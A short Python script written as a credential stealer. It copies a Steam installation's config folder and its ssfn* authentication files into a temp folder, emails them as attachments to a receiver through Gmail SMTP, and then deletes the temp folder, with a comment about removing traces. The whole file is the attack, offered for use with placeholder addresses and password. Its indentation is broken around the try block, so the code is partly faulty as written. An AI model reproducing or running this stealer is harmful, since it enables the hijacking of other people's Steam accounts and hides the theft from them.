# will need additional libraries : 
# shutil to copy files and folders.
# smtplib to send email.
# email to create and format email messages. 


import os
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def copy_and_send_files():
    steam_folder = "folder path"

    if not os.path.exists(steam_folder):
        print("wrong foler.")
        return

    config_folder = os.path.join(steam_folder, "config")
    if not os.path.exists(config_folder):
        print("config folder not found.")
        return

    temp_folder = "temp"
    os.makedirs(temp_folder, exist_ok=True)

    shutil.copytree(config_folder, os.path.join(temp_folder, "config"))

    # copy sffn* files
    ssfn_files = [file for file in os.listdir(steam_folder) if file.startswith("ssfn")]
    for file in ssfn_files:
        shutil.copy2(os.path.join(steam_folder, file), temp_folder)

    # sening to email
    email_sender = "your email"
    email_receiver = "receiver email"

    msg = MIMEMultipart()
    msg['From'] = email_sender
    msg['To'] = email_receiver
    msg['Subject'] = "Copy of config folder and ssfn* files"

    for file in os.listdir(temp_folder):
        attachment = MIMEBase('application', 'octet-stream')
        attachment.set_payload(open(os.path.join(temp_folder, file), 'rb').read())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', 'attachment', filename=file)
        msg.attach(attachment)

    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_username = "your email"
    smtp_password = "password"

try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(email_sender, email_receiver, msg.as_string())
        server.quit()
        print("Files sent successfully by email.")
    except Exception as e:
        print("error:", str(e))

    # Delete temporary folder and remove your traces
    shutil.rmtree(temp_folder)

# We start the function for copying and sending files
copy_and_send_files()